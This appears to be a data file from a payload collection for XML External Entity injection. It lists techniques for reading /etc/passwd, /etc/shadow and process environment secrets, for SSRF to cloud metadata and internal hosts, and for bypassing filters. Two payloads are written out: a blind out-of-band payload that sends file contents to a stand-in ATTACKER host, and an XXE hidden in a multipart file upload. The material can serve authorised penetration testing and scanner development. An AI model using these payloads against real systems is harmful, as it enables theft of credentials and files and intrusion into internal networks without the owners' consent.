meta.name: XXE Injection
meta.description: XML External Entity injection payloads. Covers local file read, SSRF via XXE, blind OOB exfiltration via DNS/HTTP, parameter entity techniques, and XXE in various content types.

payloads.description: Classic XXE LFI — reads /etc/passwd and includes it in the XML response
XXE reads /etc/shadow — hashed passwords (requires root privileges)
XXE reads process environment — may expose secrets, API keys, DB credentials
Windows XXE LFI — reads win.ini to confirm exploitation on Windows hosts
Windows boot.ini read — older Windows systems, confirms LFI
XXE SSRF — triggers outbound HTTP request to attacker-controlled server
XXE SSRF to AWS EC2 IMDSv1 — reads cloud instance metadata
XXE SSRF to internal network — probes internal hosts not accessible externally
XXE SSRF to localhost — accesses admin panels or internal APIs

payloads.code: <?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://ATTACKER/?x=%file;'>">%eval;%exfil;]><data/>
payloads.description: Blind XXE OOB HTTP exfil — exfiltrates file content via URL query parameter
Blind XXE via external DTD — loads attacker DTD which defines exfil entity
External DTD file content (host at ATTACKER/evil.dtd) — combines with blind XXE payload #11
Blind XXE DNS/HTTP detection probe — any response confirms XXE
Parameterized XXE error-based exfil chain — uses error messages to leak file content
Nested parameter entity test — checks if double-nested param entities are evaluated

payloads.code:
--boundary
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
payloads.description: XXE in multipart file upload — inject XXE in XML uploaded as a file
XXE in SVG upload — SVG files support DOCTYPE; useful in image upload endpoints
JAR URI scheme XXE — uploads attacker JAR to trigger RCE in some Java parsers
XXE with UTF-7 encoding bypass — evades parsers that only check for UTF-8 DOCTYPE
XXE via data URI base64 — 'data://text/plain;base64,...' encodes 'file:///etc/passwd'
DTD via SYSTEM identifier — loads external DTD without inline entity declaration
PHP filter stream wrapper in XXE — base64-encodes file to avoid special chars in XML
